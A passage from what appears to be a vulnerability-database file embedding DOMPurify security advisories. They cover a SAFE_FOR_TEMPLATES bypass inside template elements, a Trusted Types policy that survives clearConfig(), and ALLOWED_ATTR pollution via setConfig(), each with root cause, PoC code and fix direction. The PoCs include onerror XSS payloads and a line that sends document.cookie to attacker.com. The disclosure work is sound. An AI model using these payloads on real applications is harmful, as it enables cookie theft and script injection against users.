\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 -->\n  <div class=\"card\" id=\"card-ctrl\">\n    <div class=\"card-header\">\n      <span class=\"badge badge-run\" id=\"badge-ctrl\">PENDING</span>\n      <span class=\"card-title\">Control - string output (default) MUST block the payload</span>\n    </div>\n    <div class=\"card-body\">\n      <label>Same attacker input, but sanitized WITHOUT RETURN_DOM (string output path)</label>\n      <pre id=\"input-ctrl\"></pre>\n      <div class=\"arrow\">\u2193 DOMPurify.sanitize() - string path hits the regex scrub at line 2067 \u2193</div>\n      <label>OUTPUT STRING - expression should be stripped</label>\n      <pre id=\"output-ctrl\">Not run yet</pre>\n      <div class=\"note\">\n        The string output path is NOT vulnerable because\n        <code>body.innerHTML</code> serialises the template content into a\n        flat string where the full <code>${\"{...}\"}</code> expression is visible\n        and the final regex scrub catches it.\n      </div>\n    </div>\n  </div>\n\n  <!-- \u2500\u2500 Log \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 -->\n  <div class=\"card\">\n    <div class=\"card-header\">\n      <span class=\"badge badge-run\">Log</span>\n      <span class=\"card-title\">Test output</span>\n    </div>\n    <div class=\"card-body\">\n      <div id=\"log\"></div>\n    </div>\n  </div>\n\n<script>\n// \u2500\u2500 Helpers \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nlet xssConfirmed = false;\n\nfunction log(msg, type = 'info') {\n  const el = document.getElementById('log');\n  const line = document.createElement('div');\n  line.className = 'log-' + type;\n  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;\n  el.appendChild(line);\n  el.scrollTop = el.scrollHeight;\n}\n\nfunction setBadge(id, status) {\n  const el = document.getElementById('badge-' + id);\n  el.textContent = status;\n  el.className = 'badge ' + {\n    PASS: 'badge-fail',   // \"PASS\" here means the attack succeeded (bad for security)\n    BLOCK: 'badge-pass',  // \"BLOCK\" means DOMPurify correctly blocked it\n    PENDING: 'badge-run',\n    ERROR: 'badge-warn',\n  }[status];\n}\n\nfunction markXSS(poc) {\n  if (!xssConfirmed) {\n    xssConfirmed = true;\n    document.getElementById('xss-banner').style.display = 'block';\n  }\n  log('\u{1F534} XSS CONFIRMED in ' + poc + ' - expression executed in page context', 'fail');\n}\n\n// \u2500\u2500 PoC 1: RETURN_DOM + alert \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nfunction runPoC1() {\n  log('Running PoC 1 - RETURN_DOM + confirm()...', 'info');\n\n  // IMPORTANT:\n  // Build a REAL template DOM node with split TEXT nodes.\n  // HTML parsing would merge adjacent text automatically,\n  // so we construct the DOM programmatically.\n\n  const container = document.createElement('div');\n  const tmpl = document.createElement('template');\n\n  tmpl.content.appendChild(document.createTextNode('$'));\n  tmpl.content.appendChild(\n    document.createTextNode(\n      '{confirm(\"XSS - DOMPurify SAFE_FOR_TEMPLATES bypass\\\\nExpression executed in: \" + document.domain)}'\n    )\n  );\n\n  container.appendChild(tmpl);\n\n  document.getElementById('input-poc1').textContent =\n    'template.content.childNodes[0].data = \"$\"\\\\n' +\n    'template.content.childNodes[1].data = \"{confirm(...)}\"';\n\n  // Sanitize the DOM node itself\n  const sanitized = DOMPurify.sanitize(container, {\n    RETURN_DOM: true,\n    SAFE_FOR_TEMPLATES: true,\n  });\n\n  const tmplAfter = sanitized.querySelector('template');\n\n  if (!tmplAfter) {\n    document.getElementById('exec-poc1').textContent =\n      'Template element removed during sanitization';\n    setBadge('poc1', 'ERROR');\n    return;\n  }\n\n  const nodesBefore = [...tmplAfter.content.childNodes].map(\n    n => JSON.stringify(n.nodeValue)\n  );\n\n  document.getElementById('nodes-poc1').textContent =\n    'childNodes[0].data = ' + nodesBefore[0] + '\\\\n' +\n    'childNodes[1].data = ' + nodesBefore[1] + '\\\\n\\\\n' +\n    '\u2192 Neither fragment matched individually.';\n\n  log(\n    'PoC 1: Text nodes after sanitization: ' +\n    nodesBefore.join(', '),\n    'warn'\n  );\n\n  // Merge text nodes\n  tmplAfter.content.normalize();\n\n  const merged = tmplAfter.content.textContent;\n\n  document.getElementById('merged-poc1').textContent = merged;\n\n  log('PoC 1: After normalize() - merged text: ' + merged, 'warn');\n\n  try {\n    const result = new Function('return `' + merged + '`')();\n\n    document.getElementById('exec-poc1').textContent =\n      '\u2714 Expression executed successfully\\\\n' +\n      'Returned: ' + result;\n\n    setBadge('poc1', 'PASS');\n    markXSS('PoC 1');\n\n  } catch (e) {\n    document.getElementById('exec-poc1').textContent =\n      'Error: ' + e.message;\n\n    setBadge('poc1', 'ERROR');\n\n    log('PoC 1 error: ' + e.message, 'warn');\n  }\n}\n\n// \u2500\u2500 PoC 2: cookie exfiltration \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nfunction runPoC2() {\n  log('Running PoC 2 - cookie exfiltration...', 'info');\n\n  // Fake cookie for demonstration\n  document.cookie = 'session=DEADBEEF_SECRET_TOKEN; path=/';\n\n  // IMPORTANT:\n  // Build REAL split text nodes programmatically.\n  // Do NOT rely on HTML parsing.\n\n  const container = document.createElement('div');\n  const tmpl = document.createElement('template');\n\n  tmpl.content.appendChild(document.createTextNode('$'));\n\n  tmpl.content.appendChild(\n    document.createTextNode(\n      '{document.location=\"//attacker.com/steal?c=\"+document.cookie}'\n    )\n  );\n\n  container.appendChild(tmpl);\n\n  document.getElementById('input-poc2').textContent =\n    'template.content.childNodes[0].data = \"$\"\\\\n' +\n    'template.content.childNodes[1].data = \"{document.location=...}\"';\n\n  // Sanitize DOM node\n  const sanitized = DOMPurify.sanitize(container, {\n    RETURN_DOM: true,\n    SAFE_FOR_TEMPLATES: true,\n  });\n\n  const tmplAfter = sanitized.querySelector('template');\n\n  if (!tmplAfter) {\n    document.getElementById('exec-poc2').textContent =\n      'Template element removed during sanitization';\n\n    setBadge('poc2', 'ERROR');\n\n    log('PoC 2: template element missing after sanitize()', 'warn');\n\n    return;\n  }\n\n  const nodes = [...tmplAfter.content.childNodes].map(\n    n => JSON.stringify(n.nodeValue)\n  );\n\n  document.getElementById('nodes-poc2').textContent =\n    'Node 0: ' + nodes[0] + '\\\\n' +\n    'Node 1: ' + nodes[1] + '\\\\n\\\\n' +\n    '\u2192 Neither fragment individually matches template-expression regexes.';\n\n  log('PoC 2: Nodes after sanitize: ' + nodes.join(', '), 'warn');\n\n  // Merge adjacent text nodes\n  tmplAfter.content.normalize();\n\n  const merged = tmplAfter.content.textContent;\n\n  document.getElementById('merged-poc2').textContent = merged;\n\n  log('PoC 2: Merged expression: ' + merged, 'warn');\n\n  // Simulate framework evaluation\n  try {\n    new Function('return `' + merged + '`')();\n\n    const cookieValue = document.cookie;\n\n    const stealUrl =\n      '//attacker.com/steal?c=' +\n      encodeURIComponent(cookieValue);\n\n    document.getElementById('exec-poc2').textContent =\n      '\u2714 Expression successfully evaluated\\\\n\\\\n' +\n      'Would redirect victim to:\\\\n' +\n      stealUrl + '\\\\n\\\\n' +\n      'Cookie exposed:\\\\n' +\n      cookieValue;\n\n    setBadge('poc2', 'PASS');\n\n    markXSS('PoC 2');\n\n    log('PoC 2: Would exfiltrate cookie \u2192 ' + stealUrl, 'fail');\n\n  } catch (e) {\n    document.getElementById('exec-poc2').textContent =\n      'Error: ' + e.message;\n\n    setBadge('poc2', 'ERROR');\n\n    log('PoC 2 error: ' + e.message, 'warn');\n  }\n}\n// \u2500\u2500 PoC 3: IN_PLACE mode \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nfunction runPoC3() {\n  log('Running PoC 3 - IN_PLACE mode...', 'info');\n\n  // Build DOM node manually (simulates attacker-controlled DOM input,\n  // e.g. content parsed from a WebSocket message or an iframe)\n  const container = document.createElement('div');\n  const tmplEl = document.createElement('template');\n\n  // Two separate text nodes - HTML parser merges them, but programmatic\n  // DOM construction keeps them split. This is the IN_PLACE attack surface.\n  tmplEl.content.appendChild(document.createTextNode('$'));\n  tmplEl.content.appendChild(document.createTextNode('{confirm(\"XSS via IN_PLACE - domain: \" + document.domain)}'));\n  container.appendChild(tmplEl);\n\n  document.getElementById('input-poc3').textContent =\n    '// Programmatically constructed DOM node:\\n' +\n    'template.content.childNodes[0].data = \"$\"\\n' +\n    'template.content.childNodes[1].data = \"{confirm(\\\\\"XSS via IN_PLACE...\\\\\")}\"\\n\\n' +\n    '// Passed to DOMPurify.sanitize(container, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true })';\n\n  // Sanitize IN_PLACE - SAFE_FOR_TEMPLATES should strip the expression\n  DOMPurify.sanitize(container, {\n    IN_PLACE: true,\n    SAFE_FOR_TEMPLATES: true,\n  });\n\n  const tmplAfter = container.querySelector('template');\n  const nodesAfter = [...tmplAfter.content.childNodes].map(n => n.nodeValue);\n  document.getElementById('nodes-poc3').textContent =\n    'childNodes[0].data = ' + JSON.stringify(nodesAfter[0]) + '\\n' +\n    'childNodes[1].data = ' + JSON.stringify(nodesAfter[1]) + '\\n\\n' +\n    '\u2192 _scrubTemplateExpressions() did not enter template.content\\n' +\n    '\u2192 Both nodes unchanged after sanitization.';\n\n  log('PoC 3: Nodes after IN_PLACE sanitize: ' + nodesAfter.map(n => JSON.stringify(n)).join(', '), 'warn');\n\n  tmplAfter.content.normalize();\n  const merged = tmplAfter.content.textContent;\n  document.getElementById('merged-poc3').textContent = merged;\n\n  log('PoC 3: Merged: ' + merged, 'warn');\n\n  try {\n    const result = new Function('return `' + merged + '`')();\n    document.getElementById('exec-poc3').textContent =\n      '\u2714 new Function() returned: ' + result + '\\n' +\n      'confirm() dialog shown. XSS confirmed via IN_PLACE mode.';\n    setBadge('poc3', 'PASS');\n    markXSS('PoC 3');\n  } catch (e) {\n    document.getElementById('exec-poc3').textContent = 'Error: ' + e.message;\n    setBadge('poc3', 'ERROR');\n    log('PoC 3 error: ' + e.message, 'warn');\n  }\n}\n\n// \u2500\u2500 Control: string output must block \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nfunction runControl() {\n  log('Running control - string output path (should block)...', 'info');\n\n  const dirty =\n    '<template>' +\n      '<x-split-1>$</x-split-1>' +\n      '<x-split-2>{confirm(\"this should never fire\")}</x-split-2>' +\n    '</template>';\n\n  document.getElementById('input-ctrl').textContent = dirty;\n\n  // Default string output - NOT using RETURN_DOM\n  const sanitized = DOMPurify.sanitize(dirty, {\n    SAFE_FOR_TEMPLATES: true,\n    // RETURN_DOM intentionally omitted - string path is safe\n  });\n\n  document.getElementById('output-ctrl').textContent = sanitized;\n\n  const blocked = !sanitized.includes('${') && !sanitized.includes('{confirm');\n  if (blocked) {\n    setBadge('ctrl', 'BLOCK');\n    log('Control: String output correctly stripped the expression. Output: ' + sanitized, 'ok');\n  } else {\n    setBadge('ctrl', 'PASS'); // unexpected\n    log('Control: UNEXPECTED - expression survived string output path: ' + sanitized, 'fail');\n  }\n}\n\n// \u2500\u2500 Run all \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nfunction runAll() {\n  document.getElementById('log').innerHTML = '';\n  xssConfirmed = false;\n  document.getElementById('xss-banner').style.display = 'none';\n  log('=== Starting full test run ===', 'info');\n  runPoC1();\n  runPoC2();\n  runPoC3();\n  runControl();\n  log('=== Test run complete ===', 'info');\n}\n<\/script>\n\n</body>\n</html>\n\n\n```\n\n\n---\n\n## Root Cause\n\n`_scrubTemplateExpressions` (`src/purify.ts:1115`) does not recurse into `<template>.content`:\n\n```ts\nconst _scrubTemplateExpressions = function (node: Element): void {\n  node.normalize(); // Does NOT normalize inside <template>.content (DOM spec)\n  const walker = createNodeIterator.call(\n    node.ownerDocument || node,\n    node,            // NodeIterator does NOT enter <template>.content\n    NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT |\n    NodeFilter.SHOW_CDATA_SECTION | NodeFilter.SHOW_PROCESSING_INSTRUCTION,\n    null\n  );\n  // Scrubs nodes it finds, but never sees <template> content\n};\n```\n\nThe fix is to extend `_scrubTemplateExpressions` to explicitly recurse into `<template>.content`, mirroring the approach already used by `_sanitizeShadowDOM` (`src/purify.ts:1753`):\n\n```ts\nif (_isDocumentFragment(shadowNode.content)) {\n  _sanitizeShadowDOM(shadowNode.content); // already handles recursion\n}\n```\n\n### Suggested Patch Direction\n\n```ts\nconst _scrubTemplateExpressions = function (node: Element): void {\n  node.normalize();\n  const walker = createNodeIterator.call( /* existing args */ );\n\n  // ... existing scrub loop ...\n\n  // NEW: recurse into <template>.content, mirroring _sanitizeShadowDOM\n  const templates = (node as Element).querySelectorAll?.('template') ?? [];\n  arrayForEach(Array.from(templates), (tmpl: HTMLTemplateElement) => {\n    if (_isDocumentFragment(tmpl.content)) {\n      _scrubTemplateExpressions(tmpl.content as unknown as Element);\n    }\n  });\n};\n```\n\n---\n\n## Impact\n\n**Who is affected:** Applications that use DOMPurify with `SAFE_FOR_TEMPLATES: true` combined with `RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`, whose downstream template engine processes `<template>` element content.\n\n**What an attacker can achieve:** Inject arbitrary template expressions (`${...}`, `{{...}}`, `<%...%>`) into the sanitized DOM output inside `<template>` elements. If the consuming template engine evaluates these expressions, this leads to **template injection**, which in server-side contexts can escalate to **Remote Code Execution** and in client-side contexts to **Cross-Site Scripting**.\n\n### Preconditions for Exploitation\n\n| Precondition | Notes |\n|---|---|\n| `SAFE_FOR_TEMPLATES: true` | Non-default - must be explicitly set |\n| `RETURN_DOM: true` or `IN_PLACE: true` | Non-default - must be explicitly set |\n| Template engine processes `<template>.content` | Application-dependent |\n\n### What Is NOT Affected\n\nThe **string output path (default)** is not affected. The final regex scrub at `src/purify.ts:2067\u20132071` operates on the serialized HTML string, where the injected expression is visible and stripped:\n\n```ts\n// src/purify.ts:2067 - only runs on string output, not DOM output\nif (SAFE_FOR_TEMPLATES) {\n  arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {\n    serializedHTML = stringReplace(serializedHTML, expr, ' ');\n  });\n}\n```",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-gvmj-g25r-r7wr"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.9",
+                severity: "low",
+                cwe: [
+                  "CWE-693"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: Trusted Types policy survives `clearConfig()` and can poison later `RETURN_TRUSTED_TYPE` output",
+                  githubID: "GHSA-vxr8-fq34-vvx9",
+                  CVE: [
+                    "CVE-2026-65899"
+                  ]
+                },
+                details: '## Impact\n\nA DOMPurify instance that is reused across trust boundaries can stay bound to a previously supplied `TRUSTED_TYPES_POLICY` even after `clearConfig()` is called. A later caller that requests `RETURN_TRUSTED_TYPE` receives a `TrustedHTML` object created by the old policy, not by a clean default configuration.\n\nIf the old policy is unsafe or controlled by a less-trusted integration, this turns a later "default" sanitize call into script execution at a Trusted Types sink. `TRUSTED_TYPES_POLICY: null` on the later call also does not clear the retained policy.\n[dompurify-trusted-types-policy-survives-clearconfig-poc.js](https://github.com/user-attachments/files/28604913/dompurify-trusted-types-policy-survives-clearconfig-poc.js)\n\n\n## Affected version\n\nTested against DOMPurify `3.4.8`, repository commit `825e617753ac1169306a542d3174a77f717a0cf6`.\n\n## Root cause\n\n`_parseConfig()` overwrites `trustedTypesPolicy` when `cfg.TRUSTED_TYPES_POLICY` is truthy, but the default/null path only initializes the internal policy when `trustedTypesPolicy === undefined`. Once a custom policy has been set, later default config parsing leaves it in place.\n\nRelevant code:\n\n- `src/purify.ts:786-812` accepts and stores `cfg.TRUSTED_TYPES_POLICY`.\n- `src/purify.ts:813-832` does not reset an existing policy when config has no policy or has `TRUSTED_TYPES_POLICY: null`.\n- `src/purify.ts:2123-2125` signs the final serialized HTML with the retained policy when `RETURN_TRUSTED_TYPE` is true.\n- `src/purify.ts:2133-2136` `clearConfig()` only clears `CONFIG` and `SET_CONFIG`; it does not reset `trustedTypesPolicy` or `emptyHTML`.\n\n## Local PoC\n\nRun from the DOMPurify checkout, or set `DOMPURIFY_REPO`:\n\n```bash\nnode /home/dompurify-trusted-types-policy-survives-clearconfig-poc.js\n```\n\nObserved output:\n\n```json\n{\n  "result": {\n    "baseline": "<b>baseline</b>",\n    "duringPolicy": "<img src=x onerror=alert(\\"TT_POLICY_SURVIVED_CLEARCONFIG\\")>",\n    "afterClearString": "<img src=\\"x\\">",\n    "afterClearTrustedType": "[object TrustedHTML]",\n    "afterClearTrusted": "<img src=x onerror=alert(\\"TT_POLICY_SURVIVED_CLEARCONFIG\\")>",\n    "afterNullTrusted": "<img src=x onerror=alert(\\"TT_POLICY_SURVIVED_CLEARCONFIG\\")>",\n    "mountedHTML": "<img src=\\"x\\" onerror=\\"alert(&quot;TT_POLICY_SURVIVED_CLEARCONFIG&quot;)\\">"\n  },\n  "dialogs": [\n    "TT_POLICY_SURVIVED_CLEARCONFIG"\n  ]\n}\n```\n\nThe important part is the split behavior after cleanup:\n\n- `purify.clearConfig(); purify.sanitize(...);` returns a normal sanitized string (`<img src="x">`), because the later call is not asking for a Trusted Type.\n- `purify.clearConfig(); purify.sanitize(..., { RETURN_TRUSTED_TYPE: true });` still uses the old policy and returns attacker-controlled `TrustedHTML`.\n- Passing `{ TRUSTED_TYPES_POLICY: null, RETURN_TRUSTED_TYPE: true }` also still returns attacker-controlled `TrustedHTML`.\n\n## Preconditions\n\nThis is a shared-instance state contamination issue. It matters when one DOMPurify instance is reused by multiple integrations, plugins, request handlers, or components with different trust levels, and a cleanup step relies on `clearConfig()` to restore safe defaults.\n\nThis is not a default string-input bypass. An attacker must be able to influence a prior `TRUSTED_TYPES_POLICY` on the reused instance, or a less-trusted integration must have installed an unsafe policy.\n\n## Severity\n\n impact is XSS at a Trusted Types sink in applications that reuse a DOMPurify instance across trust boundaries. Attack complexity is high because exploitation depends on prior policy injection or a less-trusted integration and a later `RETURN_TRUSTED_TYPE` sink.\n\n## Suggested fix\n\nMake `clearConfig()` reset Trusted Types state as part of restoring defaults, or have `_parseConfig()` explicitly clear `trustedTypesPolicy` and `emptyHTML` when `TRUSTED_TYPES_POLICY: null` is supplied.',
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-vxr8-fq34-vvx9"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.11",
+                severity: "medium",
+                cwe: [
+                  "CWE-471",
+                  "CWE-665",
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: Permanent `ALLOWED_ATTR` pollution via `setConfig()` bypassing the hook clone-guard (incomplete fix of the 3.4.7 hook-pollution patch)",
+                  githubID: "GHSA-cmwh-pvxp-8882",
+                  CVE: [
+                    "CVE-2026-65898"
+                  ]
+                },
+                details: "## Summary\n\nDOMPurify 3.4.7 shipped a security fix (\"permanent hook pollution\") that makes a registered `uponSanitizeAttribute` hook's mutation of `data.allowedAttributes` **non-persistent** \u2014 so allowing an attribute for one element does not leak into later `sanitize()` calls. The fix clones `ALLOWED_ATTR` inside `_parseConfig`.\n\nThat guard is **silently bypassed whenever the application uses the persistent-config API `DOMPurify.setConfig()`.** `setConfig()` sets the module flag `SET_CONFIG = true`, which causes `sanitize()` to **skip `_parseConfig` entirely** \u2014 and the clone-guard lives inside `_parseConfig`. The hook is then handed the **live, shared `ALLOWED_ATTR` object**; any `data.allowedAttributes[name] = true` it writes mutates that shared object **permanently**, for the lifetime of the DOMPurify instance, across every subsequent call, and across **all** elements.\n\nIf an application uses `setConfig()` together with an `uponSanitizeAttribute` hook that conditionally allows a dangerous attribute (`onerror`, `onclick`, `onmouseover`, `srcdoc`, `formaction`, \u2026) for \"trusted\" elements, then **one trusted render permanently allows that attribute on untrusted, attacker-controlled content** \u2014 yielding stored XSS in viewers' browsers. DOMPurify applies no separate `/^on/` event-handler blocklist: attribute stripping is governed entirely by the allowlist, so a polluted allowlist is the only gate, and survival in the output is final.\n\n---\n\n## Affected configuration (preconditions)\n\nThe vulnerability is triggered when an application does **both**:\n\n1. Calls `DOMPurify.setConfig(...)` once (the recommended pattern for a fixed, persistent policy), **and**\n2. Registers an `uponSanitizeAttribute` hook that writes `data.allowedAttributes[name] = true` to conditionally allow an attribute (e.g. only for elements bearing a trust marker).\n\nThis hook pattern is demonstrated in DOMPurify's own test suite, and the per-call variant of exactly this leak is what 3.4.7 was released to fix.\n\n---\n\n## Root cause (source: `src/purify.ts`, v3.4.10)\n\nThe 3.4.7 clone-guard \u2014 only inside `_parseConfig`:\n\n```\n// src/purify.ts  _parseConfig()  (lines ~950-968)\n// \"if a hook is registered AND the set still points at the default constant, clone it.\n//  The hook then mutates the clone ... and the next default-cfg call rebinds to the untouched original.\"\nif ( ... && hooks.uponSanitizeAttribute.length > 0) {\n  ALLOWED_TAGS = clone(ALLOWED_TAGS);          // line 961\n}\nif ( ... hooks.uponSanitizeAttribute.length > 0 ... ) {\n  ALLOWED_ATTR = clone(ALLOWED_ATTR);          // line 968\n}\n```\n\n`sanitize()` skips `_parseConfig` on the persistent-config path:\n\n```\n// src/purify.ts  DOMPurify.sanitize()  (line 2369)\nif (!SET_CONFIG) {\n  _parseConfig(cfg);          // <-- clone-guard lives in here; SKIPPED when SET_CONFIG is true\n}\n```\n\n`setConfig()` sets the flag that disables the guard:\n\n```\n// src/purify.ts  (lines 2596-2598)\nDOMPurify.setConfig = function (cfg = {}) {\n  _parseConfig(cfg);\n  SET_CONFIG = true;          // every later sanitize() now skips _parseConfig\n};\n```\n\nThe hook is handed the **live** allowlist binding, and there is no secondary event-handler defense:\n\n```\n// src/purify.ts (line 2088) \u2014 hook event exposes the shared object by reference\nallowedAttributes: ALLOWED_ATTR,\n// (line 2108) hooks.uponSanitizeAttribute executed; a write to data.allowedAttributes mutates ALLOWED_ATTR itself\n// _isValidAttribute gates purely on ALLOWED_ATTR[lcName]; DOMPurify uses NO /^on/ blocklist by design.\n```\n\n**Net:** after `setConfig()`, the clone-guard never runs, so the hook's `allowedAttributes` mutation is a permanent write to the instance's shared `ALLOWED_ATTR`.\n\n---\n\n## Proof of Concept\n\nEnvironment: `npm i dompurify@3.4.10 jsdom` (Node; identical mechanism to `isomorphic-dompurify`, and to a browser instance).\n\n### PoC 1 \u2014 the leak (trusted render permanently allows `onerror` on attacker content)\n\n```js\nconst createDOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\nconst DP = createDOMPurify(new JSDOM('').window);\n\n// App init: persistent policy + a hook that allows onerror ONLY for trusted, pre-vetted elements\nDP.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });\nDP.addHook('uponSanitizeAttribute', (node, data) => {\n  if (node.getAttribute && node.getAttribute('data-trusted') === '1') {\n    data.allowedAttributes['onerror'] = true;        // intended: trusted-only\n  }\n});\n\n// 1) A trusted widget is rendered once\nDP.sanitize('<img data-trusted=\"1\" src=\"x\" onerror=\"loadWidget()\">');\n\n// 2) Later, ATTACKER-controlled content (NO data-trusted) is sanitized on the same instance\nconsole.log(DP.sanitize('<img src=\"x\" onerror=\"alert(document.cookie)\">'));\n// OUTPUT:  <img src=\"x\" onerror=\"alert(document.cookie)\">     <-- onerror SURVIVES -> XSS\n```\n\n### PoC 2 \u2014 it is a DOMPurify state-leak, not \"the app allowed `on*`\" (attribute-agnostic)\n\n```js\n// Same setConfig + hook shape, but the hook allows a BENIGN attribute (title).\n// The leak is identical -> the defect is a shared-state mutation in DOMPurify,\n// independent of which attribute the hook touches.\nDP.setConfig({ ALLOWED_TAGS: ['span'], ALLOWED_ATTR: [] });\nDP.addHook('uponSanitizeAttribute', (n, d) => {\n  if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['title'] = true;\n});\nDP.sanitize('<span data-trusted=\"1\" title=\"ok\">x</span>');\nconsole.log(DP.sanitize('<span title=\"leaked\">x</span>'));   // -> <span title=\"leaked\">x</span>  (leaked)\n```\n\n### PoC 3 \u2014 control: WITHOUT `setConfig()` the 3.4.7 guard holds\n\n```js\nconst DP2 = createDOMPurify(new JSDOM('').window);\nDP2.addHook('uponSanitizeAttribute', (n, d) => {\n  if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['onerror'] = true;\n});\nDP2.sanitize('<img data-trusted=\"1\" src=\"x\" onerror=\"ok()\">', { ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });\nconsole.log(DP2.sanitize('<img src=\"x\" onerror=\"alert(1)\">', { ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] }));\n// OUTPUT:  <img src=\"x\">     <-- onerror correctly STRIPPED. setConfig() is the trigger.\n```\n\n### Persistence (observed)\n\n- The leak **persists after `removeAllHooks()`** \u2014 removing the hook does not clean the polluted allowlist.\n- It is **global / cross-element** \u2014 a polluted `onmouseover` survives on `<a>` and `<div>`, not only the originally-blessed `<img>`.\n- It persists for the **instance lifetime** (survived 5/5 subsequent default calls).\n- `clearConfig()` **does** restore a clean state (this is the bound of the impact).\n\n---\n\n## Impact\n\nStored XSS. In a long-lived (e.g. server-side / `isomorphic-dompurify`) DOMPurify instance, a single trusted render flips a shared allowlist bit; every subsequent untrusted submission then inherits a live event-handler attribute and executes script in viewers' browsers. Because DOMPurify enforces no `/^on/` blocklist, a surviving `on*` attribute is final \u2014 no secondary control prevents execution. `onerror` on a broken-`src` `<img>` fires with no user interaction (browser-confirmed; see Validation).\n\n**Per-call `FORBID_ATTR` does not mitigate.** A defensive `sanitize(input, { FORBID_ATTR: ['onerror'] })` is also ignored once `setConfig()` has been called: the per-call config is parsed by `_parseConfig`, which `sanitize()` skips entirely under `SET_CONFIG`. So an application cannot blunt the leak with a per-call denylist \u2014 the poisoned `ALLOWED_ATTR` is the sole gate.\n\n---\n\n## Realistic attack scenario\n\nA platform mixes admin-authored interactive widgets with user-generated content through one sanitizer instance:\n\n1. The app installs a persistent baseline policy via `setConfig({ ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] })`.\n2. It registers an `uponSanitizeAttribute` hook that enables an event handler **only** for admin-vetted elements marked `data-trusted=\"1\"`, intending safe rich interactivity \u2014 a pattern the 3.4.7 fix was specifically meant to make safe.\n3. An admin renders one trusted widget. From that point on, every user-submitted comment/post containing `<img src=x onerror=...>` passes sanitization and executes for all viewers.\n\n---\n\n## Remediation\n\nExtend the existing clone-guard to the persistent-config (`SET_CONFIG`) fast-path: when `sanitize()` skips `_parseConfig` but an `uponSanitizeAttribute` hook is registered, clone the allowlists before the walk so hook mutations cannot persist \u2014 the exact analogue of the guard already present in `_parseConfig`.\n\n```js\n// In DOMPurify.sanitize(), replacing the bare `if (!SET_CONFIG) { _parseConfig(cfg); }`:\nif (!SET_CONFIG) {\n  _parseConfig(cfg);\n} else if (hooks.uponSanitizeAttribute.length > 0) {\n  // Persistent-config path: _parseConfig (and its clone-guard) is skipped, so a hook would\n  // otherwise mutate the shared ALLOWED_ATTR/ALLOWED_TAGS permanently. Clone per call.\n  if (ALLOWED_ATTR === DEFAULT_ALLOWED_ATTR || ALLOWED_ATTR === currentSetConfigAttr) {\n    ALLOWED_ATTR = 